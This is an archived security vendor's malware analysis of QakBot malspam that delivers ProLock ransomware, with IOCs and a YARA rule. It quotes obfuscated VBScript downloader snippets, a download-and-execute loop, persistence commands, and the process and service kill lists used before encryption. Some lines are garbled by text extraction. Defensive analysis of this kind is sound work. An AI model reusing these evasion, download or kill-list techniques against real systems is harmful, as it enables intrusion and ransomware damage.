{
    "id": "8584c2a9-aa6f-4515-a8d1-8080a853799f",
    "created_at": "2023-01-12T15:10:14.015388Z",
    "updated_at": "2025-03-27T02:05:38.391166Z",
    "deleted_at": null,
    "sha1_hash": "4091a3a9f22e8765efe3aea80ecc7e72dd49c900",
    "title": "2020-06-16 - QakBot malspam leading to ProLock- Nothing personal just business",
    "authors": "",
    "file_creation_date": "2022-05-28T04:51:38Z",
    "file_modification_date": "2022-05-28T04:51:38Z",
    "file_size": 1891940,
    "plain_text": "# QakBot malspam leading to ProLock: Nothing personal just business\n\n**hornetsecurity.com/en/security-information/qakbot-malspam-leading-to-prolock/**\n\nSecurity Lab June 16, 2020\n\n## Summary\n\nThe FBI and the German agency CERT-Bund [1][2] are warning of QakBot malspam currently distributing ProLock ransomware.\n\nQakBot is spread via email. In the outlined campaign, an email with a link to a ZIP archive containing a VBScript file is used to download the\nQakBot loader onto victim computers. From there, the ProLock ransomware can be loaded by the QakBot operators.\n\nThe ProLock ransomware uses RC6 to encrypt files on the victims computer. It spares the first 8 KiB of all files. It appends a `.proLock`\nextension to encrypted files and leaves a ransom note stating that it is “[n]othing personal just business” and instructions on how to pay the\nransom. However, the ransomware also deletes files ending with `.bac or` `.bak extensions, so victims will still lose those files even if they`\npay.\n\n## Background\n\nQakBot (aka. QBot, QuakBot, Pinkslipbot) has been around since 2008. The ProLock ransomware is relatively new. We have summarized a\ntimeline of recent events regarding both pieces of malware:\n\n\n-----\n\no oc s a a so a e t at as st obse ed at t e e d o 0 9 t t e t e, t as ca ed d oc e o e e, d oc e ad a bug,\nso victims were able to decrypt their files without paying the ransom. Hence, in 2020, it was rebranded as ProLock ransomware after fixing the\nflaw.\n\nEven though ProLock typically gains access to victims via RDP, it has recently been distributed via QakBot in a similar fashion that Emotet\ndistributes ransomware.\n\n## Technical Analysis\n\nThis analysis will first outline some steps of the currently observed QakBot infection chain. The relevant and interesting steps have been\noutlined in the flow chart below.\n\n\n-----\n\ne t a ect o uses a e a t a to a a c e e a c e co ta s a Sc pt e c do oads t e Qa ot oade\nLike Emotet, QakBot is able to load other malware. The latest of such distributed malware and subject of multiple warnings by governmental\ninstitutions is the ProLock ransomware.\n\nThe second part of this article gives an overview of the inner workings of the new ProLock ransomware.\n\n### Email\n\nThe observed campaign was targeting Germany and used thread hijacking, i.e., QakBot replied to existing email conversations obtained from\nprevious victims. The previous victims’ communication partners would then receive an email with a link such as this one:\n\nThe lower section of the email (not displayed here) contains the hijacked conversation thread.\n\nSince this campaign, many different campaigns have been observed, also in languages other than German.\n\n**From**\n\nEmails have the display name of the RFC5322 “From” header set to the display name of the communication partner in the highjacked\nconversation thread. The address in the RFC5322 “From” header is the real address of the sender. This way, the emails pass SPF and DKIM\nchecks.\n\nTo illustrate this, let’s assume Alice has taken part in a conversation with Bob Doe. This conversation thread is highjacked when she gets\ninfected with QakBot. The RFC5322 “From” header in the stolen emails is `Bob Doe <bob@example.com> . Now, Alice’s computer sends`\nQakBot malspam. The emails will be sent with a RFC5322 “From” header of `Bob Doe <alice@example.org> .`\n\nIn case there is no display name, the email address is used directly as display name in the RFC5322 “From” header. This behavior can be\nseen in some emails. Here is one example:\n\n\n-----\n\n**Timeframe**\n\nFrom the dates in the hijacked email conversations, it can be established that the stolen emails are mainly recent, i.e., hijacked email threads\nare only several days old when used in attacks. But unlike Emotet, the operators of this malspam operation do not seem to restrict the thread\nhijacking to current emails. We have also observed emails hijacking threads dating back to 2015.\n\n**Lure**\n\nThe emails try to lure victims into downloading from a link labeled `ANHANG ZUM DOWNLOAD by pretending that the conversation partner must`\nreview or comment the document behind the download link with different phrases. In previous English-language campaigns, the link was\nlabeled `ATTACHMENT DOWNLOAD . Here are some examples:`\n\n\n-----\n\nWhile there seems to be a finite pool of phrases (since we have observed repetitions), the phrasing is completely generic and can be replaced\nwith any other phrasing at any time. This way, these emails can be injected into virtually any conversation thread.\n\nThe link leads to a ZIP archive containing a VBScript file.\n\n### VBScript file\n\nWhile the VBScript file appears to be around 37 MiB (38045309 Bytes), it is padded with zeros:\n```\n$ hexdump -C Darlehensvertrag_8378051_19052020.vbs | less\n00000000 0a 4f 6e 20 45 72 72 6f 72 20 52 65 73 75 6d 65 |.On Error Resume|\n00000010 20 4e 65 78 74 0a 64 69 6d 20 6a 4d 52 50 42 2c | Next.dim jMRPB,|\n00000020 20 68 6d 58 74 76 6c 2c 20 68 68 71 49 43 54 2c | hmXtvl, hhqICT,|\n[...]\n00033f50 45 47 46 58 53 51 20 3d 20 46 69 78 28 44 4d 4c |EGFXSQ = Fix(DML|\n00033f60 63 63 29 0a 56 7a 4f 64 69 20 3d 20 78 61 74 43 |cc).VzOdi = xatC|\n00033f70 58 48 4e 20 6f 72 20 4e 72 4c 62 55 6d 0a 0a 00 |XHN or NrLbUm...|\n00033f80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................|\n*\n02448670 00 00 00 00 00 00 00 00 00 00 00 00 0a      |.............|\n0244867d\n(END)\n\n```\n\n-----\n\ne actua Sc pt code s o y a ou d 00 o 0 5% o t e e s s p obab y do e to a o d detect o, as so e syste s ot sca\nfiles if they surpass a specific size limit.\n\nThe script uses evasion, anti-debugging and obfuscation techniques.\n\nWe will only highlight the interesting parts of the script.\n\n**Evasion**\n\nThe script sleeps for 30000 ms:\n```\n[...]\nozcHEG = 318 - 15 + 490 + 5 - 22 - 9 - 7 + 10 + 29230\n[...]\nWScript.Sleep ozcHEG\n[...]\n\n```\nThis is probably a dynamic analysis avoidance technique. Some analysis systems use timeouts to keep the analysis time short and decide\nwhether a sample is malicious or not based on the actions it performs until the timeout.\n\n**Error suppression**\n\nThe script uses `On Error Resume Next in every function. This instructs the program to continue with the next program statement even if an`\nerror occurs.\n\n**Obfuscation**\n\nString replacement\n\nThe script uses a common string replacement technique to obfuscate real strings used in the script. The code\n```\nset o=CreateObject(replace(\"Rx1wRx1scRx1rRx1ipRx1tRx1.sRx1heRx1lRx1l\", \"Rx1\", \"\"))\n\n```\nbecomes\n```\nset o=CreateObject(\"wscript.shell\")\n\n```\nThis technique is used in multiple places throughout the script.\n\nCharacter concatenation\n\nThe script uses character concatenation to form strings from single calls to the `chr() function. The code`\n```\nqtcqQ=chr(87)&chr(105)&chr(110)&chr(77)&chr(103)&chr(109)&chr(116)&chr(115)&chr(58)&chr(123)&chr(105)&chr(109)&chr(112)&chr(101)&chr\n\n```\nbecomes\n```\nqtcqQ=\"WinMgmts:{impersonationLevel=impersonate}!\\\\\\\\.\\\\root\\\\\"\n\n```\nThis technique is used in multiple places throughout the script.\n\nXOR encryption\n\nThe script uses a very large string (defined at the beginning). We renamed the string to `LARGE_STRING . This large string is transformed 3`\ntimes via a function that uses the XOR cipher to decrypt the download URLs and executable filenames. The XOR keys are obtained by\nindexing into a smaller string we renamed to `xor_key_selection_string :`\n```\nxor_key_selection_string =\n\"J32EmExEv2QE3ZfZsFlO84vJKXRFXWutfc2vigLlDKJZNT9T0wlTWtOiqp8dSt7XJzu9VhQvxzXARwg1kjAEvzaRQJcqbW2J0HmDtXeVxk18ZFhG9zZwWTN4aGkDh0nbIIF\n[...]\nxor_key_1 = Asc(Mid(xor_key_selection_string, rZGOkh, 418 + 454 + 6 - 19 - 4 + 12 - 21 + 129 - 974))\n[...]\nTRANS_LARGE_STRING = string_transform(LARGE_STRING, xor_key_1)\njRABF  = sgzJJn * NrLbUm\nDMLcc  = 468 + 14 - 9 + 21 - 196 - 100 + 178 - 231 + 578            \nTRANS_LARGE_STRING = string_transform(TRANS_LARGE_STRING, xor_key_2)\nMGQNb = SWoDQ - xatCXHN                             \nTRANS_LARGE_STRING = string_transform(TRANS_LARGE_STRING, xor_key_3)\n\n```\n(The `xor_key_selection_string,` `xor_key_{1,2,3},` `string_transform,` `TRANS_LARGE_STRING and` `LARGE_STRING were renamed`\nby the analyst to better understand the program logic. In the original code, these were random character sequences.)\n\n**Network connection**\n\n\n-----\n\ne sc pt se ds G equests to 5 d e e t U s\n\nThe VBScript code responsible for the GET requests can be found inside the following for loop:\n```\n    For i = 1 To 6\n        ms.Open Replace(\"S12GES12TS12\", \"S12\", \"\"), RryLCg(index) & iGonf, False\n\n```\n(Please note we have used a tool to standardize the code indentation.)\n\nThe user agent is hard-coded into the script. It is a capitalized word written twice, like here:\n```\nms.setRequestHeader OIEDjshTTW, \"AlbertaAlberta\"\n\n```\nWhile the words are random and different between single samples, it is always a word written twice, e.g., `LamodaLamoda, etc.`\n\nIn the `uid parameter in the query string is a Base64-encoded string containing the versions of both the system’s antivirus software and`\nWindows:\n\nThis information is obtained via two WMI queries:\n```\nGetObject(\"WinMgmts:{impersonationLevel=impersonate}!\\\\\\\\.\\\\root\\\\SecurityCenter2\").ExecQuery(\"select * from AntiVirusProduct\")\n\n```\nand\n```\nGetObject(\"WinMgmts:{impersonationLevel=impersonate}!\\\\\\\\.\\\\root\\\\cimv2\").ExecQuery(\"select * from Win32_OperatingSystem where\nPrimary=true\")\n\n```\n(Obviously again, the original code for these two queries is obfuscated and spans several lines of code.)\n\n**Download and launch of QakBot loader**\n\nThe same GET request that sends the `uid parameter gets a PE file as a response:`\n\n\n-----\n\nThe script writes it to `%userprofile%\\AppData\\Local\\Temp\\PicturesViewer.exe and starts the executable:`\n\nThe relevant code in the VBScript file is within the aforementioned GET request for loop. It first checks the `readyState . If the request is`\n```\nDONE ( readyState = 4), it checks whether the response body size is different from 0, and, finally, whether the response content starts with\nMZ :\n[...]\nIf ms.readyState = 4 Then\n    If Len(ms.responseBody) <> 0 Then\n        If Left(ms.responseText, 2) = \"MZ\" Then\n[...]\n            .Write ms.responseBody\n[...]\n            execute RryLCg(6)\n[...]\n\n```\nNow, the downloaded QakBot loader is running, and this concludes the downloader script.\n\n### QakBot\n\nThe downloaded QakBot loader is packed. It unpacks itself at runtime in memory. It first runs itself with the `/C option flag. This causes the`\nQakBot binary to run checks to determine whether it is being run inside a sandbox. Next, it runs itself via a scheduled task using\n```\nschtasks.exe /Create /RU \\\"NT AUTHORITY\\\\SYSTEM\\\" . This allows the bot to increase its privileges. It then injects into explorer.exe\n\n```\nvia process hollowing (using `CREATE_SUSPENDED ). After that, it obtains persistence via run keys`\n( HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run ), as well as with a scheduled task ( schtasks.exe /create /tr\n```\nmjezacl.exe /sc HOURLY /mo 5 ).\n\n```\nAfter that, it queries `www.ip-address.com for the external IP of the infected system. At last, in the deterministic part of its execution chain, it`\nestablishes communication with the C2 (proxy) servers.\n\nThis way, QakBot, like Emotet, can also load further modules as well as additional malware. In this case, QakBot downloads and executes\nProLock.\n\n\n-----\n\ne o e a a y g o oc, et s a e a qu c oo at Qa ot s C s\n\n**C2**\n\nThe C2 IP’s mainly come from the United States, and to a much lesser extent from Romania. However, the distribution may vary slightly from\ncampaign to campaign.\n\nThe distribution run using tag `spx128, for instance, had its third cluster of IPs in Mexico:`\n\nOn the other hand, the distribution run using tag `spx116 and a German-language lure has slightly more C2 IPs from Europe:`\n\nHowever, English-speaking countries seem to be the main origin of C2 IPs. This distribution indicates QakBot was mainly focused on Englishspeaking countries. However, as the campaign targeting Germany has shown, this focus may now be shifting towards establishing QakBot as\na more global operation akin to Emotet.\n\nIn case the origin of the C2 IPs would adapt to the targeted country, we would expect a much bigger shift towards German IPs. It is therefore\nunknown whether the shift observed in campaigns targeting Germany is only coincidental and the QakBot operators simply do not have a\nsignificant amount of C2 IPs from Europe.\n\nThe C2 IP list changes very frequently.\n\n### ProLock\n\nAs previously outlined, various governmental organisations warn about QakBot distributing the new variant of PwndLocker called ProLock.\nHence, we will quickly outline the main findings with regard to the new ProLock ransomware.\n\n\n-----\n\no pub c y a a ab e sou ces, t s o t at t e cu e t o oc a a t s de e ed dde a age e a ed `g` `b p` s\nimage is completely black except for some white pixels. These white pixels in the top right are where the binary code of ProLock is stored:\n\nFrom there, ProLock is loaded into memory and executed via PowerShell.\n\n**PowerShell loader**\n\nThe code of the PowerShell loader reads as follows:\n\n(Image Source: [3])\n\nDepending on the pointer size ( [IntPtr]::size ), i.e., the operating system’s bit depth, the PowerShell will write the data at `0xA230 (32-`\nbit) or `0xD7A0 (64-bit) into memory and execute it.`\n\nWe will follow the 32-bit variant.\n\n**Unpacking**\n\nFirst, an decoding stub unpacks the payload:\n\n\n-----\n\nThe unpacking uses a simple XOR cipher starting at offset `0xa27f (into` `WinMgr.bmp ) with key` `0x09b1a2dc .`\n\nThe shellcode of the unpacked payload uses PEB traversal starting from `FS:[0x30] to obtain the list of loaded modules. It hashes the DLL`\nnames and compares them against a hash of `KERNEL32.DLL . This way, the address of` `kernel32.dll is obtained. After that,`\n```\nLoadLibraryA, GetProcAddress and VirtualAlloc are resolved by traversing the kernel32.dll export directory, hashing the\n\n```\nfunction names in it and comparing them against a list of hashes of the corresponding functions:\n\n\n-----\n\nThroughout the code, `call label; db 'string'; label: ... code sequences are used to load string addresses into memory:`\n\nNote: In the 64-bit version, RIP-relative addressing (which is not available in the 32-bit version) is used.\n\n\n-----\n\nt t e oaded st gs, add t o a b a es a d u ct o s a e eso ed a d sto ed e o y o ate use\n\n**Preparation**\n\nProLock then proceeds to delete the following files via `DeleteFileA :`\n```\n   C:\\\\Programdata\\\\WinMgr.xml\n   C:\\\\Programdata\\\\WinMgr.bmp\n   C:\\\\Programdata\\\\clean.bat\n   C:\\\\Programdata\\\\run.bat\n\n```\nIt disconnects all connections shared resources, except hidden shares:\n\n\n-----\n\nt e u e ates t e u g p ocesses us g C eate oo `e p3 S aps ot a d` `ocess3 {` `st, e t}` u ct o s\n\nThe first 6 characters of each process name are compared against a list:\n\n\n-----\n\nIn case a process matches,\n```\ntaskkill.exe /F /IM is invoked on it via ShellExecuteA :\n\n```\n\n-----\n\nThe searched and killed processes start with: `agntsv,` `cntaos,` `dbeng5,` `dbsnmp,` `encsvc,` `excel.,` `firefo,` `infopa,` `isqlpl,`\n```\nmbamtr, msacce, msftes, mspub., mydesk, mysqld, ntrtsc, ocauto, ocomm., ocssd., onenot, oracle, outloo,\npccntm, powerp, sqbcor, sqlage, sqlbro, sqlser, sqlwri, steam., syncti, tbirdc, thebat, thunde, tmlist,\nvisio., winwor, wordpa, xfssv, czoolz .\n\n```\nNext, `net.exe stop \"<service>\" /y is used to stop a large list of services:`\n\nThe services on ProLock’s service kill list belong to security products, but also to database and backup systems which would retain a lock on\nopened files thus preventing the ransomware from encrypting them.\n\nThe searched services are `CSFalconService,` `McAfeeFramework,` `Alerter,` `AcronisAgent,` `Acronis VSS Provider,`\n```\nBackupExecAgentAccelerator, BackupExecDeviceMediaService, BackupExecJobEngine, BackupExecManagementService,\nBackupExecRPCService, BackupExecVSSProvider, DFSR, EPIntegrationService, EPProtectedService, EPSecurityService,\nEPUpdateService, MB3Service, MBAMService, MBEndpointAgent, MSExchangeES, MSExchangeMGMT, MSExchangeMTA,\nMSExchangeSA, MSExchangeSRS, MSExchangeADTopology, MSExchangeDelivery, MSExchangeDiagnostics, MSExchangeEdgeSync\nMSExchangeHM, MSExchangeHMRecovery, MSExchangeIS, MSExchangeMailboxReplication, MSExchangeRPC, MSExchangeRepl,\nMSExchangeServiceHost, MSExchangeTransport, MSExchangeUM, MSExchangeUMCR, MSOLAP$*, MSSQLSERVER, MsDtsServer,\nMySQL57, OSearch15, OracleClientCache80, QuickBooksDB25, SPAdminV4, SPSearchHostController, SPTraceV4,\nSPUserCodeV4, SPWriterV4, SQLBrowser, SQLSafeOLRService, SQLsafe Backup Service, SQLSERVERAGENT, SQLTELEMETRY,\nSQLBackups, SQLAgent$*, MSSQL$*, MSMQ, ReportServer, ReportServer$*, SQLWriter, SQLBackupAgent, Symantec System\nRecovery, SyncoveryVSSService, VeeamBackupSvc, VeeamCatalogSvc, VeeamCloudSvc, VeeamEndpointBackupSvc,\n\n```\n\n-----\n\n```\n eea te p se a age S c, eea ou tS c, eea SS c, eea S S c, eea a spo tS c, eea ac up Cata og ata\nService, epag, epredline, mozyprobackup, masvc, macmnsvc, mfemms, McAfeeDLPAgentService, psqlWGE, swprv,\nwsbexchange, WinVNC4, TMBMServer, tmccsf, tmlisten, VSNAPVSS, stc_endpt_svc, wbengine, bbagent, NasPmService,\nBASupportExpressStandaloneService_N_Central, BASupportExpressSrvcUpdater_N_Central, hasplms, EqlVss,\nEqlReqService, RapidRecoveryAgent, YTBackup, vhdsvc, TeamViewer, MSOLAP$SQL_2008, MSOLAP$SYSTEM_BGC, MSOLAP$TPS,\nMSOLAP$TPSAMA, MSSQL$BKUPEXEC, MSSQL$ECWDB2, MSSQL$PRACTICEMGT, MSSQL$PRACTTICEBGC, MSSQL$PROD,\nMSSQL$PROFXENGAGEMENT, MSSQL$SBSMONITORING, MSSQL$SHAREPOINT, MSSQL$SOPHOS, MSSQL$SQL_2008, MSSQL$SQLEXPRESS,\nMSSQL$SYSTEM_BGC, MSSQL$TPS, MSSQL$TPSAMA, MSSQL$VEEAMSQL2008R2, MSSQL$VEEAMSQL2012, MSSQLFDLauncher,\nMSSQLFDLauncher$PROFXENGAGEMENT, MSSQLFDLauncher$SBSMONITORING, MSSQLFDLauncher$SHAREPOINT,\nMSSQLFDLauncher$SQL_2008, MSSQLFDLauncher$SYSTEM_BGC, MSSQLFDLauncher$TPS, MSSQLFDLauncher$TPSAMA, MSSQLSERVER,\nMSSQLServerADHelper, MSSQLServerADHelper100, MSSQLServerOLAPService, SQLAgent$BKUPEXEC,\nSQLAgent$CITRIX_METAFRAME, SQLAgent$CXDB, SQLAgent$ECWDB2, SQLAgent$PRACTTICEBGC, SQLAgent$PRACTTICEMGT,\nSQLAgent$PROD, SQLAgent$PROFXENGAGEMENT, SQLAgent$SBSMONITORING, SQLAgent$SHAREPOINT, SQLAgent$SOPHOS,\nSQLAgent$SQL_2008, SQLAgent$SQLEXPRESS, SQLAgent$SYSTEM_BGC, SQLAgent$TPS, SQLAgent$TPSAMA,\nSQLAgent$VEEAMSQL2008R2, SQLAgent$VEEAMSQL2012, ReportServer$SQL_2008, ReportServer$SYSTEM_BGC, ReportServer$TPS,\n\n```\nand `ReportServer$TPSAMA .`\n\nFinally, ProLock uses the following commands to delete the volume shadow copies:\n\nProLock `vssadmin.exe commands.`\n\nThe commands are passed to `vssadmin.exe, which is again invoked via` `ShellExecuteA :`\n\nProLock `vssadmin.exe invocation.`\n\nProLock enumerates all drive letters for the shadow copy deletion, excluding only CD-ROM drives ( DRIVE_CDROM ):\n\n**Ransom**\n\n\n-----\n\no oc does ot see to e c ypt t e st 8 o es es s a e t a 8 a e, e ce, ot e c ypted at a do ot ece e a `p o oc`\nextension, either.\n\nFiles and directories are processed according to several file lists:\n\nProLock will avoid files with an extension of `.exe,` `.dll,` `.lnk,` `.ico,` `.msi,` `.chm,` `.sys,` `.hlf,` `.lng,` `.ttf, and` `.cmd .`\n\n**Files with extensions** `.bac or` `.bak are deleted.`\n\nFurther, ProLock does not traverse directories named `$Recycle.Bin,` `Windows,` `Boot,` `System Volume Information,` `PerfLogs,`\n```\nCommon Files, DVD Maker, Internet Explorer, Kaspersky Lab, Kaspersky Lab Setup Files, WindowsPowerShell,\nMicrosoft, Microsoft.NET, Mozilla Firefox, MSBuild, Windows Defender, Windows Mail, Windows Media Player,\nWindows NT, Windows Photo Viewer, Windows Portable Devices, Windows Sidebar, WindowsApps, and Uninstall\nInformation . Additionally, the following directories in the profile directory are not traversed: Adobe, Microsoft,\nMicrosoft_Corporation, Packages, and Temp .\n\n```\nProLock uses multiple threads. There is a threaded function that traverses the directory structures. Encryption and file renaming is handled by\nother threaded functions:\n\n\n-----\n\nFor the encryption, ProLock uses the processor’s `RDTSC opcode to obtain random numbers, which it uses to generate the subsequent`\nencryption key:\n\nThe files themselves seem to be encrypted with RC6. The RC6 key schedule function can be identified by the RC6 constants `0xb7e15163,`\nand `0x9e3779b9, as well as the typical 44 count loop initializing the key structure found in the malware code:`\n\nAfter encryption, a `.proLock extension is appended to each encrypted file:`\n\n\n-----\n\nDuring directory traversal and before encryption, ProLock leaves a file named `[HOW TO RECOVER FILES].TXT with its ransom note in each`\ndirectory:\n```\nYour files have been encrypted by ProLock Ransomware using RSA-2048 algorithm.\n  [.:Nothing personal just business:.]\nNo one can help you to restore files without our special decryption tool.\nTo get your files back you have to pay the decryption fee in BTC.\nThe final price depends on how fast you write to us.\n  1. Download TOR browser: https://www.torproject.org/\n  2. Install the TOR Browser.\n  3. Open the TOR Browser.\n  4. Open our website in the TOR browser: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx.onion\n  5. Login using your ID XXXXXXXXXXXXXXXXXXXX\n  ***If you have any problems connecting or using TOR network:\n  contact our support by email chec1kyourf1les@protonmail.com.\n  [You'll receive instructions and price inside]\nThe decryption keys will be stored for 1 month.\nWe also have gathered your sensitive data.\nWe would share it in case you refuse to pay.\nDecryption using third party software is impossible.\nAttempts to self-decrypting files will result in the loss of your data.\n\n```\nObviously, the promise that this is “[n]othing personal just business” is no comfort to the victims.\n\nWe did not observe a network connection from the analyzed ProLock sample. However, we have not analyzed the complete chain leading up\nto the deployment of this ProLock sample. It is possible for the perpetrators to deploy data-stealing malware before deploying the ProLock\nransomware. Hence, the threat to “share” “gathered […] sensitive data” could be real.\n\n## Conclusion and Remediation\n\nA ransom should not be paid. In the past, ProLock, under the name PwndLocker at that time, had problems with their decryptor, preventing\nvictims from decrypting their files. The FBI has stated similar concerns with the latest version. And as this analysis showed, files ending in\n```\n.bac or .bak are not encrypted but deleted, meaning that there will likely be significant data loss even if a victim pays.\n\n```\nYou should have backups that are inaccessible to ransomware.\n\nHornetsecurity’s [Spam Filtering and Malware Protection blocks known patterns and URLs of QakBot emails.](https://www.hornetsecurity.com/en/services/spam-filter/)\n\nHornetsecurity’s [Advanced Threat Protection, with URL Rewriting, replaces URLs in emails with secure URLs. On click, the user is forwarded](https://www.hornetsecurity.com/en/services/advanced-threat-protection/)\nto the secured website via the Hornetsecurity ATP proxy, which scans downloadable content and blocks access to malware. This protects\nagainst the malicious link in the initial email, thus preventing the download of the QakBot VBScript file in the first place.\n\n\n-----\n\n## References\n\n[1] [https://twitter.com/certbund/status/1263581728414691329](https://twitter.com/certbund/status/1263581728414691329)\n\n[2] [https://twitter.com/certbund/status/1261317907268751360](https://twitter.com/certbund/status/1261317907268751360)\n\n[3] [https://twitter.com/AltShiftPrtScn/status/1239966261313847298](https://twitter.com/AltShiftPrtScn/status/1239966261313847298)\n\n## Indicators of Compromise (IOCs)\n\n### Hashes\n\n**SHA256** **Filename** **Description**\n\n`20cd1626d319f10323f5abda86fc11d0ed3783bd65f9c3a6501841e783edf61d` `Darlehensvertrag_8378051_19052020.vbs` VBScript\nQakBot\nDownloader\n\n`0cd872e07f9e1929b9b3baf7f86af70ccb28763bd4f1a16ebad659ea262106a5` `888888.png` QakBot\nloader\nsample\n\n`a6ded68af5a6e5cc8c1adee029347ec72da3b10a439d98f79f4b15801abd7af0` `Winmgr.bmp` BMP\ncontaining\nProLock\nshellcode as\npayload\n\n## Signatures\n\n### YARA\n```\nrule prolock_decoder_stub\n{\n  meta:\n    description = \"Detects ProLock decoder stubs\"\n    author = \"Hornetsecurity Security Lab\"\n    date = \"2020-06-03\"\n    hash1 = \"a6ded68af5a6e5cc8c1adee029347ec72da3b10a439d98f79f4b15801abd7af0\"\n  strings:\n    $decoder_stub_32 = {\n      55 89 e5 8b 4? ?? eb ?? 89 4? ?? 8d 15 ?? ?? ?? ?? 8d 05\n      ?? ?? ?? ?? 83 e8 ?? 29 c2 8b 4? ?? 01 c2 31 db b8 ?? ??\n      ?? ?? 31 04 1a 81 3c 1a ?? ?? ?? ?? 74 ?? 83 fb ?? 75 ??\n      31 04 1a 40 eb ?? eb ?? 83 c3 ?? 81 3c 1a ?? ?? ?? ?? 74\n      ?? eb ?? }\n    $decoder_stub_64 = {\n      55 48 89 e5 48 89 4? ?? 48 8b 4? ?? eb ?? 49 89 c3 48 8d\n      15 ?? ?? ?? ?? 48 8d 05 ?? ?? ?? ?? 48 83 e8 ?? 48 29 c2\n      4c 89 d8 48 01 c2 48 31 db 48 c7 c0 ?? ?? ?? ?? 31 04 1a\n      81 3c 1a ?? ?? ?? ?? 74 ?? 48 83 fb ?? 75 ?? 31 04 1a 48\n      ff c0 eb ?? eb ?? 48 83 c3 ?? 81 3c 1a ?? ?? ?? ?? 74 ??\n      eb ?? }\n  condition:\n    any of ($decoder_stub_*)\n}\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-06-16 - QakBot malspam leading to ProLock- Nothing personal just business.pdf"
    ],
    "report_names": [
        "2020-06-16 - QakBot malspam leading to ProLock- Nothing personal just business.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673536214,
    "ts_updated_at": 1743041138,
    "ts_creation_date": 1653713498,
    "ts_modification_date": 1653713498,
    "files": {
        "pdf": "https://archive.orkl.eu/4091a3a9f22e8765efe3aea80ecc7e72dd49c900.pdf",
        "text": "https://archive.orkl.eu/4091a3a9f22e8765efe3aea80ecc7e72dd49c900.txt",
        "img": "https://archive.orkl.eu/4091a3a9f22e8765efe3aea80ecc7e72dd49c900.jpg"
    }
}